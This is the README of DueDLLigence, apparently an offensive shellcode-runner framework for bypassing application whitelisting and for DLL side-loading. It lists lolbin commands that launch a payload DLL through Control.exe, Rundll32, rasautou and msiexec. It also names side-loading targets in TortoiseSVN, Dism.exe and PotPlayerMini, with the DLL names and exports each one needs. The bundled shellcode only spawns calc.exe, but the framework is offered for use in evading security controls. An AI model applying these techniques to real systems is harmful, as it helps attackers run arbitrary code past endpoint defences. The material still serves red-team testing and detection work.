# DueDLLigence

Shellcode runner framework for application whitelisting bypasses and DLL side-loading. The shellcode included in this project spawns calc.exe.


If desired, change the injection type by modifying the following line to the appropriate injection type
<br>```public const ExecutionMethod method = ExecutionMethod.CreateThread;```

Running the DLL with the following legitimate exes 

## Application Whitelisting Bypasses. Lolbins

### Control.exe
Export: CPlApplet
Syntax: Rename compiled “dll” extension to “cpl” and just double click it!
<br>```Control.exe [cplfile]```
<br>```Rundll32.exe Shell32.dll, Control_RunDLL [cplfile]```

### Rasautou
Export: powershell
<br>```rasautou –d {dllpayload} –p powershell –a a –e e```

### Msiexec
Export: DllUnregisterServer
<br>```msiexec /z {full path to msiexec.dll}```

## DLL Side-Loading Binaries and Details
### Tortoise SVN (SubWCRev.exe)
DLL == "crshhndl.dll"; Arch == x64; OS == Win7 & 10;
<br>Exports: InitCrashHandler,SendReport,IsReadyToExit,SetCustomInfo,AddUserInfoToReport,RemoveUserInfoFromReport,AddFileToReport,RemoveFileFromReport,GetVersionFromApp,GetVersionFromFile

### Dism Image Servicing Utility (Dism.exe)
DLL == "DismCore.dll"; Arch == x64; OS == Win7 & 10;
<br>Export: DllGetClassObject

### PotPlayerMini
DLL == "PotPlayer.dll"; Arch == x86;
<br>Exports: PreprocessCmdLineExW,UninitPotPlayer,CreatePotPlayerExW,DestroyPotPlayer,SetPotPlayRegKeyW,RunPotPlayer

Credit for the DueDLLigence name goes to Paul Sanders (@saul_panders)
